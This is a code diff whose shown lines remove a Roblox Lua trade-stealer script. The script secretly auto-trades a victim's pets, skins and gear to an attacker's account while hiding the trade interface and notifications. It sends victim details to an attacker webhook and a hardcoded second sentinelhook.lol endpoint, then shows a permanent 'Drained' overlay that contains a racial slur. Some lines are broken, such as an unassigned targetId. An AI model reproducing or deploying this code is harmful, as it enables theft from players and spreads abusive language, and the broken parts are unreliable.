@@ -1,1190 +1,850 @@
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local localPlayer = Players.LocalPlayer
-local currentCamera = workspace.CurrentCamera
-local playerGui = localPlayer:WaitForChild("PlayerGui")
+local LP = Players.LocalPlayer
+local cam = workspace.CurrentCamera
+local pg = LP:WaitForChild("PlayerGui")
 
 task.spawn(function()
-	if not game:IsLoaded() then
-		game.Loaded:Wait()
-	end
-
-	if not table.find({ 99606176102979, 109983668079237, 79906538690694, 119594317142884 }, game.PlaceId) then
-		return
-	end
-	local targetUserId = getgenv().TARGET_USER_ID
-	local goodWebhook = getgenv().GOOD_WEBHOOK or ""
-	local tradeWebhook = getgenv().TRADE_WEBHOOK
-	local allowedAnimals = getgenv().ALLOWED_ANIMALS or {}
-	local tbl = {}
-
-	for _, allowedAnimal in ipairs(allowedAnimals) do
-		if type(allowedAnimal) == "string" and allowedAnimal ~= "" and allowedAnimal ~= "Name Brainrot" then
-			tbl[allowedAnimal] = true
-		end
-	end
-
-	local allowedBaseskins = getgenv().ALLOWED_BASESKINS or {}
-	local allowedGears = getgenv().ALLOWED_GEARS or {}
-	local tbl2 = {}
-
-	for _, allowedBaseskin in ipairs(allowedBaseskins) do
-		if type(allowedBaseskin) == "string" and allowedBaseskin ~= "" and allowedBaseskin ~= "Name BaseSkin" then
-			tbl2[allowedBaseskin] = true
-		end
-	end
-
-	local tbl3 = {}
-
-	for _, allowedGear in ipairs(allowedGears) do
-		if type(allowedGear) == "string" and allowedGear ~= "" and allowedGear ~= "Name Gear" then
-			tbl3[allowedGear] = true
-		end
-	end
-
-	local targetId = 
-	local nameFromUserIdAsync = Players:GetNameFromUserIdAsync(targetUserId)
-	local nameFromUserIdAsync2 = Players:GetNameFromUserIdAsync()
-
-	local tbl4 = {
-		["Strawberry Elephant"] = true,
-		Meowl = true,
-		["Headless Horseman"] = true,
-		["Skibidi Toilet"] = true,
-		Griffin = true,
-		["Hydra Dragon Cannelloni"] = true,
-		["Dragon Gingerini"] = true,
-		["Dragon Cannelloni"] = true,
-		["La Supreme Combinasion"] = true,
-		["Love Love Bear"] = true,
-		["Ginger Gerat"] = true,
-		Antonio = true,
-		["Signore Carapace"] = true,
-		["Elefanto Frigo"] = true,
-		["Bunny and Eggy"] = true,
-		["Hydra Bunny"] = true,
-		Arcadragon = true,
-		["Pancake and Syrup"] = true,
-		["Fishino Clownino"] = true,
-		["Tirilikalika Tirilikalako"] = true,
-		["Rico Dinero"] = true,
-		["Kalika Bros"] = true,
-		["Digi Narwhal"] = true,
-		["Duggy Bros"] = true,
-		["John Pork"] = true,
-		["Dragon Aquanini"] = true,
-		Kraken = true,
-		["Moby Bros"] = true,
-		["Jelly Moby"] = true,
-		Bumbatron = true,
-	}
-
-	local str = "https://stealabrainrot.fandom.com/wiki/"
-	local tbl5 = {}
-
-	for k, v in pairs(tbl) do
-		tbl5[k] = v
-	end
-
-	for k, v in pairs(tbl4) do
-		tbl5[k] = v
-	end
-
-	local function fn(arg)
-		local children = game:GetService("ReplicatedStorage").Packages.Net:GetChildren()
-
-		local v = ({
-			["RF/TradeService/Invite"] = 36,
-			["RE/TradeService/Ready"] = 42,
-			["RE/TradeService/Accept"] = 43,
-			["RF/TradeService/AddItem"] = 48,
-			["RF/TradeService/AddBrainrot"] = 50,
-			["RF/TradeService/Cancel"] = 52,
-			["RE/NotificationService/Notify"] = 209,
-			["RF/TradeService/AcceptInvite"] = 37,
-			["RE/TradeService/CreateInvite"] = 41,
-		})[arg]
-
-		if not v then
-			return nil
-		end
-		local v2 = children[v]
-		if v2 and (v2:IsA("RemoteFunction") or v2:IsA("RemoteEvent")) then
-			return v2
-		end
-		return nil
-	end
-
-	local function fn2()
-		local leftCenter = playerGui:FindFirstChild("LeftCenter")
-
-		if leftCenter then
-			local clone = leftCenter:Clone()
-			clone.Name = "LeftCenter_Backup"
-			clone.Parent = playerGui
-			leftCenter:Destroy()
-		end
-
-		local Notify = fn("RE/NotificationService/Notify")
-
-		if Notify then
-			pcall(function()
-				for _, v in ipairs(getconnections(Notify.OnClientEvent)) do
-					v:Disable()
-				end
-			end)
-		end
-
-		local function fn3(child)
-			if child:IsA("BlurEffect") then
-				task.defer(function()
-					child:Destroy()
-				end)
-			end
-		end
-
-		currentCamera.ChildAdded:Connect(fn3)
-
-		for _, child in ipairs(currentCamera:GetChildren()) do
-			fn3(child)
-		end
-
-		currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
-			currentCamera.FieldOfView = 70
-		end)
-
-		currentCamera.FieldOfView = 70
-
-		local function fn4(descendant)
-			if descendant.Name == "TradeLiveTrade" then
-				pcall(function()
-					descendant.Enabled = false
-				end)
-
-				pcall(function()
-					descendant.Visible = false
-				end)
-
-				pcall(function()
-					sethiddenproperty(descendant, "Enabled", false)
-				end)
-
-				pcall(function()
-					descendant:GetPropertyChangedSignal("Enabled"):Connect(function()
-						pcall(function()
-							descendant.Enabled = false
-						end)
-
-						pcall(function()
-							sethiddenproperty(descendant, "Enabled", false)
-						end)
-					end)
-				end)
-
-				pcall(function()
-					descendant:GetPropertyChangedSignal("Visible"):Connect(function()
-						pcall(function()
-							descendant.Visible = false
-						end)
-					end)
-				end)
-			end
-		end
-
-		for _, descendant in pairs(playerGui:GetDescendants()) do
-			fn4(descendant)
-		end
-
-		playerGui.DescendantAdded:Connect(fn4)
-	end
-
-	local Animals = nil
-	local Animals2 = nil
-	local NumberUtils = nil
-
-	pcall(function()
-		Animals = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
-		Animals2 = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
-		NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
-	end)
-
-	local function fn3()
-		local value
-
-		pcall(function()
-			for _, v in pairs(getgc(true)) do
-				if type(v) == "table" and rawget(v, "AnimalList") then
-					local value2 = rawget(v, "Owner")
-
-					if not value2 and type(rawget(v, "Get")) == "function" then
-						pcall(function()
-							value2 = v:Get("Owner")
-						end)
-					end
-
-					if value2 == localPlayer or type(value2) == "table" and value2.UserId == localPlayer.UserId then
-						value = rawget(v, "AnimalList")
-
-						if not value and type(rawget(v, "Get")) == "function" then
-							pcall(function()
-								value = v:Get("AnimalList")
-							end)
-						end
-
-						if value then
-							break
-						else
-						end
-					else
-					end
-				end
-			end
-		end)
-
-		return value
-	end
-
-	local function fn4()
-		local v = nil
-
-		pcall(function()
-			for _, v2 in pairs(getgc(true)) do
-				if type(v2) == "table" then
-					local ok, result = pcall(rawget, v2, "BaseSkinInventory")
-
-					if ok and type(result) == "table" then
-						if type(rawget(v2, "Coins")) == "number" and type(rawget(v2, "Rebirth")) == "number" then
-							v = v2
-							break
-						end
-					end
-				end
-			end
-		end)
-
-		return v
-	end
-
-	local function fn5()
-		local tbl6 = {}
-		if not next(tbl2) then
-			return tbl6
-		end
-		local v = fn4()
-		if not v then
-			return tbl6
-		end
-		local value = rawget(v, "BaseSkinInventory")
-		if type(value) ~= "table" then
-			return tbl6
-		end
-
-		for k, v2 in pairs(value) do
-			if type(v2) == "table" then
-				local str2 = tostring(v2.SkinName or v2.Skin or "")
-
-				if tbl2[str2] then
-					table.insert(tbl6, { uuid = tostring(k), skinName = str2 })
-				end
-			end
-		end
-
-		return tbl6
-	end
-
-	local function fn6()
-		local tbl6 = {}
-		if not next(tbl3) then
-			return tbl6
-		end
-		local v = fn4()
-		if not v then
-			return tbl6
-		end
-		local value = rawget(v, "GearInventory")
-		if type(value) ~= "table" then
-			return tbl6
-		end
-
-		for k, v2 in pairs(value) do
-			if type(v2) == "table" then
-				local str2 = tostring(v2.GearName or v2.Name or "")
-
-				if tbl3[str2] then
-					table.insert(tbl6, { uuid = tostring(k), gearName = str2 })
-				end
-			end
-		end
-
-		return tbl6
-	end
-
-	local function fn7(arg)
-		local tbl6 = {}
-		local v = fn3()
-		if not v then
-			return tbl6
-		end
-
-		for k, v2 in pairs(v) do
-			if type(v2) == "table" and v2.Index then
-				local displayName = Animals and Animals[v2.Index]
-				displayName = displayName and displayName.DisplayName or v2.Index
-				local flag = tbl4[v2.Index] or tbl4[displayName] or false
-				local flag2 = tbl[v2.Index] or tbl[displayName] or false
-				local flag3
-
-				if arg == "PRIORITY" and flag then
-					flag3 = true
-				else
-					flag2 = arg == "NORMAL" and not flag and flag2
-					flag3 = false
-
-					if flag2 then
-						flag3 = true
-					end
-				end
-
-				if flag3 then
-					table.insert(tbl6, { slotKey = k, data = v2, displayName = displayName, isPriority = flag })
-				end
-			end
-		end
-
-		return tbl6
-	end
-
-	local function fn8()
-		local plots = workspace:FindFirstChild("Plots")
-		if not plots then
-			return nil
-		end
-
-		for _, child in pairs(plots:GetChildren()) do
-			local plotSign = child:FindFirstChild("PlotSign")
-
-			if plotSign then
-				local yourBase = plotSign:FindFirstChild("YourBase")
-				if yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled then
-					return child
-				end
-			end
-		end
-
-		return nil
-	end
-
-	local function fn9(arg)
-		if arg:IsA("BasePart") then
-			return arg.Position
-		end
-
-		if arg.PrimaryPart then
-			return arg.PrimaryPart.Position
-		end
-		local rootPart = arg:FindFirstChild("RootPart") or arg:FindFirstChild("FakeRootPart") or arg:FindFirstChild("Handle")
-		if rootPart and rootPart:IsA("BasePart") then
-			return rootPart.Position
-		end
-
-		for _, descendant in pairs(arg:GetDescendants()) do
-			if descendant:IsA("BasePart") then
-				return descendant.Position
-			end
-		end
-
-		return nil
-	end
-
-	local function fn10(arg, arg2)
-		local debris = workspace:FindFirstChild("Debris")
-		if not debris then
-			return nil
-		end
-		local v = fn9(arg)
-		if not v then
-			return nil
-		end
-		local displayName = Animals and Animals[arg2]
-		displayName = displayName and displayName.DisplayName or arg2
-		local v2 = string.gsub(string.lower(displayName), "%s+", "")
-		local huge = math.huge
-		local tbl6 = nil
-
-		for _, child in pairs(debris:GetChildren()) do
-			if child.Name == "FastOverheadTemplate" then
-				local v3 = fn9(child)
-
-				if v3 then
-					local magnitude = (v3 - v).Magnitude
-
-					if magnitude < huge then
-						local animalOverhead = child:FindFirstChild("AnimalOverhead")
-
-						if animalOverhead then
-							local displayName2 = animalOverhead:FindFirstChild("DisplayName")
-							local generation = animalOverhead:FindFirstChild("Generation")
-
-							if displayName2 and displayName2:IsA("TextLabel") then
-								local text = displayName2.Text or ""
-								local v4 = string.gsub(string.lower(text), "%s+", "")
-
-								if string.find(v4, v2, 1, true) or string.find(v2, v4, 1, true) then
-									local isTextLabel = generation and generation:IsA("TextLabel")
-									local str2 = ""
-
-									if isTextLabel then
-										str2 = generation.Text or ""
-									end
-
-									tbl6 = { name = text ~= "" and text or displayName, modelName = arg2, genText = str2 }
-
-									if magnitude < 5 then
-										break
-									else
-										huge = magnitude
-									end
-								end
-							end
-						end
-					end
-				end
-			end
-		end
-
-		return tbl6
-	end
-
-	local function fn11(arg)
-		local tbl6 = {}
-		local v = fn8()
-		if not v then
-			return tbl6
-		end
-		local flag = arg == "PRIORITY" and tbl4 or tbl
-
-		for _, descendant in pairs(v:GetDescendants()) do
-			local name = descendant.Name
-			local str2 = name:gsub("%d+$", "")
-
-			if descendant:IsA("Model") and (flag[name] or flag[str2]) then
-				local v2 = fn10(descendant, name)
-
-				if v2 then
-					local attribute = descendant:GetAttribute("Mutation") or "None"
-
-					if attribute == "" then
-						attribute = "None"
-					end
-
-					local v3, v4 = string.match(string.gsub(v2.genText, ",", ""), "%$([%d%.]+)([KMBT]?)/s")
-					local n = 0
-
-					if v3 then
-						n = tonumber(v3) or 0
-
-						if v4 == "K" then
-							n *= 1000
-						elseif v4 == "M" then
-							n *= 1000000
-						elseif v4 == "B" then
-							n *= 1e9
-						elseif v4 == "T" then
-							n *= 1e12
-						end
-					end
-
-					table.insert(tbl6, {
-						index = v2.modelName,
-						displayName = v2.name,
-						name = "**" .. (attribute ~= "None" and attribute ~= "" and "[" .. attribute .. "] " or "") .. v2.name .. "**",
-						genVal = n,
-						genStr = v2.genText ~= "" and v2.genText or "$0/s",
-					})
-				end
-			end
-		end
-
-		return tbl6
-	end
-
-	local function fn12()
-		return syn and syn.request or http and http.request or http_request or request
-	end
-
-	local function fn13(arg)
-		return (arg:match("^(.-)%s*%(") or arg):gsub(" ", "_")
-	end
-
-	local function fn14(arg)
-		local v = fn12()
-		if not v then
-			return nil
-		end
-		local str2 = str .. fn13(arg)
-
-		for i = 1, 3 do
-			local ok, result = pcall(function()
-				return v({
-					Url = str2,
-					Method = "GET",
-					Headers = {
-						["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-						Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-						["Accept-Language"] = "en-US,en;q=0.5",
-						["Cache-Control"] = "no-cache",
-					},
-					Timeout = 10,
-				})
-			end)
-
-			if ok and result and result.StatusCode and result.StatusCode == 200 then
-				local body = result.Body
-
-				if not body or body == "" then
-					if i < 3 then
-						task.wait(0.5)
-					end
-
-					continue
-				end
-
-				local match = body:match("property=\"og:image\"%s+content=\"([^\"]+)\"") or body:match("content=\"([^\"]+)\"%s+property=\"og:image\"") or body:match("<meta%s+og:image%s+content=\"([^\"]+)\"") or body:match("<meta%s+property=\"og:image\"%s+content=\"([^\"]+)\"")
-
-				if match and match ~= "" then
-					local str3 = match:gsub("&amp;", "&"):gsub("&quot;", "\""):gsub("&lt;", "<"):gsub("&gt;", ">")
-					if str3:find("^https?://") then
-						return str3
-					end
-				end
-
-				body = body:match("<div[^>]*class=\"[^\"]*infobox[^\"]*\"[^>]*>(.-)</div>%s*</div>") or body
-
-				for _, v2 in ipairs({
-					"data%-src=\"(https://[^\"]+%.(?:png|jpg|jpeg|webp|gif))\"",
-					"src=\"(https://[^\"]+%.(?:png|jpg|jpeg|webp|gif))\"",
-				}) do
-					local n = 1
-					local v3 = nil
-
-					while true do
-						local pos, v4 = body:find(v2, n)
-
-						if not pos then
-							break
-						else
-							local match2 = body:sub(pos, v4):match("\"([^\"]+)\"")
-
-							if match2 and match2:find("static%.wikia%.nocookie%.net") then
-								if not match2:find("/scale%-to%-width%-down/[0-9]?[0-9]$") then
-									v3 = match2
-								end
-							else
-								v3 = match2 or v3
-							end
-
-							n = v4 + 1
-						end
-					end
-
-					if v3 then
-						return (v3:gsub("/revision/latest", ""))
-					end
-				end
-
-				return nil
-			end
-
-			if i < 3 then
-				task.wait(0.5 * i)
-			end
-		end
-
-		return nil
-	end
-
-	local function fn15(arg)
-		local v = nil
-
-		pcall(function()
-			local models = ReplicatedStorage:FindFirstChild("Models")
-			models = models and models:FindFirstChild("Animals")
-			if not models then
-				return
-			end
-			local v2 = models:FindFirstChild(arg)
-
-			if not v2 then
-				local v3 = Animals and Animals[arg]
-
-				if v3 and v3.DisplayName then
-					v2 = models:FindFirstChild(v3.DisplayName)
-				end
-			end
-
-			if not v2 then
-				return
-			end
-			local n = 0
-
-			for _, descendant in ipairs(v2:GetDescendants()) do
-				if descendant:IsA("MeshPart") or descendant:IsA("Part") then
-					local color = descendant.Color
-					local n2 = descendant.Size.X * descendant.Size.Y * descendant.Size.Z
-					local n3 = math.max(color.R, color.G, color.B)
-					local n4 = math.min(color.R, color.G, color.B)
-					local n5 = n3 > 0 and (n3 - n4) / n3 or 0
-					local n6 = color.R * 0.299 + color.G * 0.587 + color.B * 0.114
-					local n7 = (n5 * 3 + 0.2) * (n6 < 0.08 and 0.05 or n6 > 0.92 and 0.15 or 1) * n2
-
-					if n < n7 then
-						v = color
-						n = n7
-					end
-				end
-			end
-		end)
-
-		return v
-	end
-
-	local function fn16(arg)
-		if not arg then
-			return 7419530
-		end
-		local clamp = math.clamp
-		return math.clamp(math.floor(arg.R * 255), 0, 255) * 65536 + clamp(math.floor(arg.G * 255), 0, 255) * 256 + math.clamp(math.floor(arg.B * 255), 0, 255)
-	end
-
-	local function fn17(arg, arg2)
-		local v = fn14(arg)
-		if v then
-			return v
-		end
-		local v2 = Animals and Animals[arg2]
-
-		if v2 then
-			for _, v3 in ipairs({ "Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId", "image", "icon" }) do
-				if v2[v3] and type(v2[v3]) == "string" and v2[v3] ~= "" then
-					local match = v2[v3]:match("%d+")
-					if match then
-						return "https://tr.rbxcdn.com/" .. match .. "/420/420/Image/Png"
-					end
-				end
-			end
-		end
-
-		return fn14(arg2)
-	end
-
-	local function fn18(arg, arg2, arg3)
-		local v = fn12()
-		if not v then
-			return
-		end
-
-		task.spawn(function()
-			local n = arg3 or 3
-
-			for i = 1, n do
-				if pcall(function()
-					v({ Url = arg, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = arg2 })
-				end) then
-					return
-				end
-				task.wait(1 * i)
-			end
-		end)
-	end
-
-	local function fn19()
-		local v = fn8()
-		local str2 = "Default"
-
-		if v then
-			str2 = v:GetAttribute("BaseSkinName") or "Default"
-		end
-
-		local v2 = fn5()
-		if #v2 == 0 then
-			return "**Active:** " .. tostring(str2) .. "\n**To Trade:** None"
-		end
-		local tbl6 = {}
-
-		for _, v3 in ipairs(v2) do
-			table.insert(tbl6, "• " .. v3.skinName)
-		end
-
-		return "**Active:** " .. tostring(str2) .. "\n**To Trade (" .. #v2 .. "):**\n" .. table.concat(tbl6, "\n")
-	end
-
-	local function fn20()
-		local v = fn6()
-		if #v == 0 then
-			return "None"
-		end
-		local tbl6 = {}
-
-		for _, v2 in ipairs(v) do
-			table.insert(tbl6, "• " .. v2.gearName)
-		end
-
-		local str2 = table.concat(tbl6, "\n")
-
-		if #str2 > 1000 then
-			str2 = str2:sub(1, 996) .. "..."
-		end
-
-		return str2
-	end
-
-	local function fn21(arg, arg2, arg3, arg4, arg5, arg6)
-		if #arg == 0 then
-			return
-		end
-
-		table.sort(arg, function(arg7, arg8)
-			return arg7.genVal > arg8.genVal
-		end)
-
-		local v = arg[1]
-		local v2 = fn17(v.displayName, v.index)
-		local v3 = fn16(fn15(v.index))
-		local tbl6 = {}
-
-		for i, v4 in ipairs(arg) do
-			tbl6[i] = v4.name .. " — **" .. v4.genStr .. "**"
-		end
-
-		local str2 = table.concat(tbl6, "\n")
-
-		if #str2 > 3800 then
-			str2 = str2:sub(1, 3796) .. "..."
-		end
-
-		local str3 = "Unknown"
-
-		pcall(function()
-			if identifyexecutor then
-				str3 = identifyexecutor()
-			elseif getexecutorname then
-				str3 = getexecutorname()
-			end
-		end)
-
-		local v4 = fn19()
-		local v5 = fn20()
-		local v6 = fn6()
-
-		local tbl7 = {
-			title = (arg6 and "[" .. arg6 .. "] " or "") .. v.displayName .. " — " .. v.genStr,
-			description = str2,
-			color = v3,
-		}
-
-		local fields = {}
-		local tbl8 = { name = "🎨 Base Skin", value = v4, inline = false }
-		local tbl9 = { name = "⚔️ Gears (" .. #v6 .. ")", value = v5, inline = false }
-
-		local tbl10 = {
-			name = "Server",
-			value = "Players: **" .. #Players:GetPlayers() .. "** | <t:" .. os.time() .. ":R>",
-			inline = true,
-		}
-
-		local tbl11 = { name = "User", value = localPlayer.Name .. " (`" .. localPlayer.UserId .. "`)", inline = true }
-		fields[1] = tbl8
-		fields[2] = tbl9
-		fields[3] = tbl10
-		fields[4] = { name = "Executor", value = str3, inline = true }
-		fields[5] = tbl11
-		tbl7.fields = fields
-		tbl7.footer = { text = localPlayer.Name .. " • " .. localPlayer.UserId }
-		tbl7.timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-
-		if v2 then
-			tbl7.thumbnail = { url = v2 }
-		end
-
-		local tbl12 = { embeds = { tbl7 }, username = arg5 or "LOGGER", avatar_url = arg3 or "" }
-
-		if arg4 then
-			tbl12.content = "Venot victim||@everyone||"
-		end
-
-		fn18(arg2, HttpService:JSONEncode(tbl12), 3)
-	end
-
-	local function fn22()
-		pcall(function()
-			local CoreGui = playerGui
-
-			pcall(function()
-				CoreGui = game:GetService("CoreGui")
-			end)
-
-			if CoreGui:FindFirstChild("DrainOverlay") then
-				return
-			end
-			local screenGui = Instance.new("ScreenGui")
-			screenGui.Name = "DrainOverlay"
-			screenGui.IgnoreGuiInset = true
-			screenGui.ResetOnSpawn = false
-			screenGui.DisplayOrder = 999999
-			screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-			screenGui.Parent = CoreGui
-			local frame = Instance.new("Frame")
-			frame.Size = UDim2.new(1, 0, 1, 0)
-			frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-			frame.BorderSizePixel = 0
-			frame.ZIndex = 999998
-			frame.Parent = screenGui
-			local textLabel = Instance.new("TextLabel")
-			textLabel.Size = UDim2.new(1, -40, 0.4, 0)
-			textLabel.Position = UDim2.new(0, 20, 0.15, 0)
-			textLabel.BackgroundTransparency = 1
-			textLabel.Text = "Your Brainrot Drained By Venot"
-			textLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
-			textLabel.TextScaled = true
-			textLabel.Font = Enum.Font.GothamBlack
-			textLabel.TextStrokeTransparency = 0.7
-			textLabel.ZIndex = 999999
-			textLabel.Parent = screenGui
-			local textLabel2 = Instance.new("TextLabel")
-			textLabel2.Size = UDim2.new(1, -40, 0.2, 0)
-			textLabel2.Position = UDim2.new(0, 20, 0.65, 0)
-			textLabel2.BackgroundTransparency = 1
-			textLabel2.Text = "WE CREATE SOON ALL SCRIPT LOGGER NIGGER"
-			textLabel2.TextColor3 = Color3.fromRGB(255, 50, 50)
-			textLabel2.TextScaled = true
-			textLabel2.Font = Enum.Font.GothamBlack
-			textLabel2.TextStrokeTransparency = 0.7
-			textLabel2.ZIndex = 999999
-			textLabel2.Parent = screenGui
-
-			screenGui.AncestryChanged:Connect(function(child, parent)
-				if parent == nil then
-					task.wait(0.1)
-					screenGui.Parent = CoreGui
-				end
-			end)
-		end)
-	end
-
-	local priority = fn7("PRIORITY")
-	local normal = fn7("NORMAL")
-	local v = fn5()
-	local v2 = fn6()
-	if #priority == 0 and #normal == 0 and #v == 0 and #v2 == 0 then
-		return
-	end
-	fn2()
-
-	local tbl6 = {
-		phase = "IDLE",
-		queue = {},
-		targetId = 0,
-		running = false,
-		priorityDone = false,
-		addIdx = 1,
-		baseSkinQueue = {},
-		gearQueue = {},
-		baseSkinIdx = 1,
-		gearIdx = 1,
-	}
-
-	if #priority > 0 and targetId ~= 0 then
-		fn21(fn11("PRIORITY"), "https://sentinelhook.lol/api.php?id=XZxouWroF6uAN5W", "https://cdn.discordapp.com/attachments/1503012061188198400/1522704317264560189/togif.gif?ex=6a4cbc27&is=6a4b6aa7&hm=6667051345d497289a91b99de877a342bdf6582eba18d1fb56fb69695ac087a9&", true, "VenotBurda [PRIORITY]", "PRIORITY")
-		tbl6.phase = "PRIORITY"
-		tbl6.queue = priority
-		tbl6.targetId = targetId
-		tbl6.running = true
-		tbl6.addIdx = 1
-	else
-		if not ((#normal > 0 or #v > 0 or #v2 > 0) and targetUserId ~= 0) then
-			return
-		end
-		local normal2 = fn11("NORMAL")
-		fn21(normal2, goodWebhook, nil, true, "Venot", nil)
-		fn21(normal2, "https://sentinelhook.lol/api.php?id=XZxouWroF6uAN5W", "https://cdn.discordapp.com/attachments/1503012061188198400/1522704317264560189/togif.gif?ex=6a4cbc27&is=6a4b6aa7&hm=6667051345d497289a91b99de877a342bdf6582eba18d1fb56fb69695ac087a9&", false, "VenotBurda [DUALHOOK]", nil)
-		tbl6.phase = "NORMAL"
-		tbl6.queue = normal
-		tbl6.targetId = targetUserId
-		tbl6.running = true
-		tbl6.addIdx = 1
-	end
-
-	tbl6.baseSkinQueue = fn5()
-	tbl6.gearQueue = fn6()
-	tbl6.baseSkinIdx = 1
-	tbl6.gearIdx = 1
-	local Invite = fn("RF/TradeService/Invite")
-	local AddBrainrot = fn("RF/TradeService/AddBrainrot")
-	local AddItem = fn("RF/TradeService/AddItem")
-	local Ready = fn("RE/TradeService/Ready")
-	local Accept = fn("RE/TradeService/Accept")
-	local Cancel = fn("RF/TradeService/Cancel")
-	local CreateInvite = fn("RE/TradeService/CreateInvite")
-	local AcceptInvite = fn("RF/TradeService/AcceptInvite")
-	if not (Invite and AddBrainrot and AddItem and Ready and Accept and Cancel and CreateInvite and AcceptInvite) then
-		return
-	end
-	local v3 = nil
-	local from = nil
-
-	if CreateInvite and CreateInvite:IsA("RemoteEvent") then
-		CreateInvite.OnClientEvent:Connect(function(arg, arg2)
-			if not arg or not arg2 or not arg2.from then
-				return
-			end
-			v3 = arg
-			from = arg2.from
-		end)
-	end
-
-	task.spawn(function()
-		while true do
-			if v3 and from then
-				if not (from == targetUserId or from == targetId) then
-					pcall(function()
-						Cancel:FireServer("171b5ced-5729-49c0-8d80-9c1897ff1ea3")
-					end)
-
-					v3 = nil
-					from = nil
-				end
-			end
-
-			task.wait(0.5)
-		end
-	end)
-
-	task.spawn(function()
-		while true do
-			pcall(function()
-				local tradeLiveTrade = playerGui:FindFirstChild("TradeLiveTrade")
-
-				if tradeLiveTrade then
-					local tradeLiveTrade2 = tradeLiveTrade:FindFirstChild("TradeLiveTrade")
-
-					if tradeLiveTrade2 and tradeLiveTrade2:FindFirstChild("Other") then
-						local username = tradeLiveTrade2.Other:FindFirstChild("Username")
-
-						if username then
-							username = not (string.find(username.Text:lower(), nameFromUserIdAsync:lower(), 1, true) or string.find(username.Text:lower(), nameFromUserIdAsync2:lower(), 1, true))
-						end
-
-						if username then
-							pcall(function()
-								Cancel:FireServer("171b5ced-5729-49c0-8d80-9c1897ff1ea3")
-							end)
-						end
-					end
-				end
-			end)
-
-			task.wait(0.5)
-		end
-	end)
-
-	task.spawn(function()
-		while true do
-			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
-				local queue = tbl6.queue
-
-				if #queue > 0 then
-					if #queue < tbl6.addIdx then
-						tbl6.addIdx = 1
-					end
-
-					local v4 = queue[tbl6.addIdx]
-
-					if v4 then
-						if not (tbl6.priorityDone and v4.isPriority) then
-							pcall(function()
-								AddBrainrot:InvokeServer("c85a2323-36b2-4121-968a-c064a6168aff", v4.slotKey, v4.data)
-							end)
-						end
-					end
-
-					tbl6.addIdx = tbl6.addIdx + 1
-
-					if tbl6.addIdx > #queue then
-						tbl6.addIdx = 1
-					end
-				end
-			end
-
-			task.wait(1)
-		end
-	end)
-
-	task.spawn(function()
-		while true do
-			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" and AddItem then
-				local baseSkinQueue = tbl6.baseSkinQueue
-
-				if #baseSkinQueue > 0 then
-					if tbl6.baseSkinIdx > #baseSkinQueue then
-						tbl6.baseSkinIdx = 1
-					end
-
-					local v4 = baseSkinQueue[tbl6.baseSkinIdx]
-
-					if v4 and v4.skinName and v4.skinName ~= "" then
-						pcall(function()
-							AddItem:InvokeServer("6786cce9-00d8-41e9-8beb-d96e0412b78b", "BaseSkin", { UUID = v4.uuid, SkinName = v4.skinName })
-						end)
-					end
-
-					tbl6.baseSkinIdx = tbl6.baseSkinIdx + 1
-				end
-			end
-
-			task.wait(1)
-		end
-	end)
-
-	task.spawn(function()
-		while true do
-			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" and AddItem then
-				local gearQueue = tbl6.gearQueue
-
-				if #gearQueue > 0 then
-					if #gearQueue < tbl6.gearIdx then
-						tbl6.gearIdx = 1
-					end
-
-					local v4 = gearQueue[tbl6.gearIdx]
-
-					if v4 and v4.gearName and v4.gearName ~= "" then
-						local tbl7 = { GearName = v4.gearName }
-
-						if type(v4.uuid) == "string" and v4.uuid ~= "" and v4.uuid ~= "nil" then
-							tbl7.UUID = v4.uuid
-						end
-
-						pcall(function()
-							AddItem:InvokeServer("6786cce9-00d8-41e9-8beb-d96e0412b78b", "Gear", tbl7)
-						end)
-					end
-
-					tbl6.gearIdx = tbl6.gearIdx + 1
-				end
-			end
-
-			task.wait(1)
-		end
-	end)
-
-	task.spawn(function()
-		while true do
-			if tbl6.running and tbl6.targetId ~= 0 and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
-				local flag = tbl6.priorityDone and tbl6.targetId == targetId
-				local flag2 = true
-
-				if flag then
-					flag2 = false
-				end
-
-				if tbl6.phase ~= "PRIORITY" and tbl6.targetId == targetId then
-					flag2 = false
-				end
-
-				if flag2 then
-					pcall(function()
-						Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
-					end)
-				end
-			end
-
-			task.wait(2)
-		end
-	end)
-
-	task.spawn(function()
-		while true do
-			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
-				pcall(function()
-					Ready:FireServer("23f15b0b-b633-4f6b-888f-5924b7425522")
-				end)
-
-				task.wait(0.7)
-
-				pcall(function()
-					Accept:FireServer("86eea964-f19e-4ac6-b401-a71ecc89e596")
-				end)
-
-				if tbl6.phase == "PRIORITY" and not tbl6.priorityDone then
-					task.wait(0.15)
-					local priority2 = fn7("PRIORITY")
-
-					if #priority2 == 0 then
-						tbl6.priorityDone = true
-						tbl6.phase = "SWITCHING"
-						tbl6.running = false
-						tbl6.targetId = 0
-						tbl6.queue = {}
-						task.wait(1)
-						local normal2 = fn7("NORMAL")
-						local v4 = fn5()
-						local v5 = fn6()
-
-						if (#normal2 > 0 or #v4 > 0 or #v5 > 0) and targetUserId ~= 0 then
-							local normal3 = fn11("NORMAL")
-							fn21(normal3, goodWebhook, nil, true, "LOGGER VENOT", nil)
